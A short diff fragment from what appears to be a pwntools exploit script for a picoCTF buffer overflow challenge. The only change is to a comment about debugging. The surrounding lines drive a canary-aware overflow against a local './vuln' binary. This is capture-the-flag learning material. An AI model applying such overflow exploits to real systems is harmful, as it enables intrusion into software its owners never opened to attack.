@@ -29,7 +29,7 @@ for i in range(4):
 
 #typical buffer overflow now that we know the canary value
 t = pwn.process("./vuln")
-#pwn.gdb.attach(t) #useful if debugging on your own system.
+#pwn.gdb.attach(t) #useful if debugging on your own system, does not work well inside of picoCTF web shell.
 t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
 t.sendline("56")
 t.recvuntil(b'Input> ')
